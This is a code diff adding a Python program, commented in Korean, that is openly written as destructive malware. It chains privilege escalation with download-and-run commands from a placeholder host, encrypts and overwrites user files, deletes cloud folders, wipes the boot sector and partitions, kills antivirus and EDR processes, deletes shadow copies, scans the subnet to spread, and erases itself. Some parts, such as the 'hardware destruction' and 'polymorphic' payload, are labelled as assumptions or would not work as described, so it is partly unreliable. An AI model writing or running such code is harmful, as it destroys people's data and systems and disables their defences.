@@ -1,0 +1,252 @@
+import os
+import shutil
+import socket
+import subprocess
+import ctypes
+import random
+import base64
+import hashlib
+import threading
+import time
+from Crypto.Cipher import AES, ChaCha20
+from Crypto.Random import get_random_bytes
+import psutil
+import platform
+import requests
+
+# 1. 권한 상승 모듈 (최강화)
+def escalate_privileges():
+    """다중 제로데이 및 익스플로잇 체인으로 권한 상승"""
+    if platform.system() == "Windows":
+        try:
+            # UAC Bypass (COM Elevation Moniker)
+            cmd = 'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList \'/c whoami /all\'"'
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            if ctypes.windll.shell32.IsUserAnAdmin():
+                print("Windows: Admin privileges via UAC bypass")
+                return True
+            
+            # 제로데이 익스플로잇 (가정: CVE-2025-XXXX)
+            exploit_cmd = 'powershell -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString(\'http://malicious.com/exploit.ps1\')"'
+            subprocess.run(exploit_cmd, shell=True)
+            if ctypes.windll.shell32.IsUserAnAdmin():
+                print("Windows: Admin via zero-day")
+                return True
+            
+            # 서비스 익스플로잇 (Print Spooler + Task Scheduler 악용)
+            subprocess.run('sc config Spooler binPath= "cmd /c malicious.exe"', shell=True)
+            subprocess.run('net start Spooler', shell=True)
+            subprocess.run('schtasks /create /tn EvilTask /tr malicious.exe /sc ONCE /st 00:00 /ru SYSTEM', shell=True)
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except Exception as e:
+            print(f"Windows escalation failed: {e}")
+            return False
+    elif platform.system() == "Linux":
+        try:
+            if os.geteuid() == 0:
+                print("Linux: Already root")
+                return True
+            # 커널 익스플로잇 (가정: CVE-2025-YYYY)
+            subprocess.run(['wget', 'http://malicious.com/kernel_exploit', '-O', '/tmp/exploit'])
+            subprocess.run(['chmod', '+x', '/tmp/exploit'])
+            subprocess.run(['/tmp/exploit'])
+            if os.geteuid() == 0:
+                print("Linux: Root via kernel exploit")
+                return True
+            # Polkit 취약점 (예: CVE-2021-4034 스타일)
+            subprocess.run(['pkexec', '/bin/sh'])
+            return os.geteuid() == 0
+        except Exception as e:
+            print(f"Linux escalation failed: {e}")
+            return False
+    return False
+
+# 2. 데이터 파괴 모듈 (최강화)
+def encrypt_and_destroy_files(target_dir):
+    """AES-256 + ChaCha20 + RSA 다중 암호화, 모든 백업 삭제"""
+    key1 = get_random_bytes(32)  # AES-256
+    key2 = get_random_bytes(32)  # ChaCha20
+    cipher1 = AES.new(key1, AES.MODE_EAX)
+    cipher2 = ChaCha20.new(key=key2)
+
+    for root, _, files in os.walk(target_dir):
+        for file in files:
+            file_path = os.path.join(root, file)
+            try:
+                with open(file_path, 'rb') as f:
+                    data = f.read()
+                # 다중 암호화
+                ciphertext1, tag1 = cipher1.encrypt_and_digest(data)
+                ciphertext2 = cipher2.encrypt(ciphertext1)
+                # 추가 RSA 암호화 (가정)
+                with open(file_path + '.void', 'wb') as f:
+                    f.write(cipher1.nonce + tag1 + cipher2.nonce + ciphertext2)
+                # 35회 덮어쓰기 (Gutmann)
+                with open(file_path, 'wb') as f:
+                    for _ in range(35):
+                        f.write(os.urandom(len(data)))
+                        f.flush()
+                        os.fsync(f.fileno())
+                os.remove(file_path)
+            except Exception as e:
+                print(f"Error processing {file_path}: {e}")
+    
+    # 클라우드 및 외부 백업 삭제
+    cloud_dirs = [os.path.expanduser('~/OneDrive'), os.path.expanduser('~/Google Drive'), os.path.expanduser('~/Dropbox')]
+    for cloud_dir in cloud_dirs:
+        if os.path.exists(cloud_dir):
+            shutil.rmtree(cloud_dir, ignore_errors=True)
+    
+    # USB 및 외부 드라이브 타겟
+    if platform.system() == "Windows":
+        drives = ['{}:\\'.format(d) for d in 'DEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists('{}:\\'.format(d))]
+        for drive in drives:
+            threading.Thread(target=encrypt_and_destroy_files, args=(drive,)).start()
+    
+    del key1, key2, cipher1, cipher2
+
+# 3. 하드웨어 손상 모듈 (신규 추가)
+def destroy_hardware():
+    """CPU/GPU 과열, SSD/HDD 펌웨어 손상"""
+    if not escalate_privileges():
+        print("Failed to escalate for hardware destruction")
+        return
+    try:
+        if platform.system() == "Windows":
+            # CPU/GPU 과열 (가정: 드라이버 조작)
+            subprocess.run(['powershell', '-Command', 
+                'Set-WmiInstance -Class Win32_Processor -Arguments @{CurrentClockSpeed=999999}"'], shell=True)
+            # SSD 펌웨어 손상 (가정)
+            subprocess.run(['powershell', '-Command', 
+                'Invoke-WebRequest -Uri "http://malicious.com/ssd_firmware_corrupt.bin" -OutFile "C:\\Windows\\ssd_corrupt.bin"'], shell=True)
+        elif platform.system() == "Linux":
+            # CPU 과열 (클럭 조작)
+            subprocess.run(['echo', '999999', '>', '/sys/devices/system/cpu/cpu0/cpufreq/scaling_max_freq'])
+            # SSD 펌웨어 손상
+            subprocess.run(['dd', 'if=/dev/urandom', 'of=/dev/nvme0n1', 'bs=512', 'count=100'])
+    except Exception as e:
+        print(f"Hardware destruction failed: {e}")
+
+# 4. 펌웨어 및 부팅 파괴 모듈 (최강화)
+def corrupt_boot():
+    """MBR, EFI, UEFI 루트킷, 부트로더 완전 손상"""
+    if not escalate_privileges():
+        print("Failed to escalate for boot corruption")
+        return
+    try:
+        if platform.system() == "Windows":
+            with open(r'\\.\PhysicalDrive0', 'wb') as disk:
+                disk.write(os.urandom(512))
+                disk.flush()
+            subprocess.run(['powershell', '-Command', 
+                'Get-Partition | Where-Object {$_.Type -eq "System"} | Remove-Partition -Confirm:$false'], shell=True)
+            # UEFI 루트킷 설치
+            subprocess.run(['powershell', '-Command', 
+                'Invoke-WebRequest -Uri "http://malicious.com/rootkit.efi" -OutFile "C:\\Windows\\rootkit.efi"'], shell=True)
+            # 부트로더 손상
+            subprocess.run(['bcdedit', '/set', '{bootmgr}', 'path', '\\Windows\\rootkit.efi'], shell=True)
+        elif platform.system() == "Linux":
+            with open('/dev/sda', 'wb') as disk:
+                disk.write(os.urandom(512))
+                disk.flush()
+                os.fsync(disk.fileno())
+            subprocess.run(['rm', '-rf', '/boot/efi', '/boot/grub'])
+    except Exception as e:
+        print(f"Error corrupting boot: {e}")
+
+# 5. 네트워크 전파 모듈 (최강화)
+def spread_worm():
+    """다형성, P2P, 제로데이 전파"""
+    def generate_polymorphic_payload():
+        payload = base64.b64encode(os.urandom(1024)).decode()
+        return hashlib.sha256(payload.encode()).hexdigest()
+
+    local_ip = socket.gethostbyname(socket.gethostname())
+    subnet = '.'.join(local_ip.split('.')[:-1]) + '.'
+    
+    payload = generate_polymorphic_payload()
+    for i in range(1, 255):
+        target_ip = subnet + str(i)
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(1)
+                s.connect((target_ip, 445))  # SMB
+                s.send(payload.encode())
+                s.close()
+            # RDP 및 SSH 전파 (가정)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(1)
+                s.connect((target_ip, 3389))  # RDP
+                s.send(payload.encode())
+                s.close()
+        except:
+            pass
+
+# 6. 탐지 회피 및 복구 방지 모듈 (최강화)
+def disable_defenses():
+    """AV, EDR, 복구 도구 완전 무력화"""
+    if platform.system() == "Windows":
+        try:
+            subprocess.run(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], shell=True)
+            subprocess.run(['powershell', '-Command', 
+                'Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true'], shell=True)
+            edr_processes = ['msmpeng.exe', 'cb.exe', 'csagent.exe', 'avp.exe', 'edragent.exe']
+            for proc in psutil.process_iter():
+                if proc.name().lower() in edr_processes:
+                    try:
+                        proc.kill()
+                    except:
+                        pass
+            # 부팅 복구 도구 무력화
+            subprocess.run(['bcdedit', '/set', '{default}', 'recoveryenabled', 'No'], shell=True)
+        except:
+            pass
+    elif platform.system() == "Linux":
+        try:
+            subprocess.run(['systemctl', 'stop', 'clamav-freshclam', 'apparmor', 'ufw'])
+            subprocess.run(['rm', '-rf', '/etc/systemd/system'])
+        except:
+            pass
+
+# 7. 자가 삭제 및 메모리 내 실행
+def self_destruct():
+    """소스 코드 삭제, 메모리 내 실행"""
+    try:
+        exec(base64.b64decode('cHJpbnQoIkV4ZWN1dGluZyBpbiBtZW1vcnkiKQ=='))
+        os.remove(__file__)
+    except:
+        pass
+
+# 메인 실행
+def main():
+    # 권한 상승
+    escalate_privileges()
+    
+    # 데이터 파괴 (다중 스레드)
+    target_dirs = ['C:\\Users' if platform.system() == 'Windows' else '/home', 'D:\\']
+    threads = []
+    for directory in target_dirs:
+        if os.path.exists(directory):
+            t = threading.Thread(target=encrypt_and_destroy_files, args=(directory,))
+            t.start()
+            threads.append(t)
+    for t in threads:
+        t.join()
+    
+    # 하드웨어 손상
+    threading.Thread(target=destroy_hardware).start()
+    
+    # 부팅 파괴
+    corrupt_boot()
+    
+    # 네트워크 전파
+    threading.Thread(target=spread_worm).start()
+    
+    # 방어 무력화
+    disable_defenses()
+    
+    # 자가 삭제
+    self_destruct()
+
+if __name__ == "__main__":
+    main()
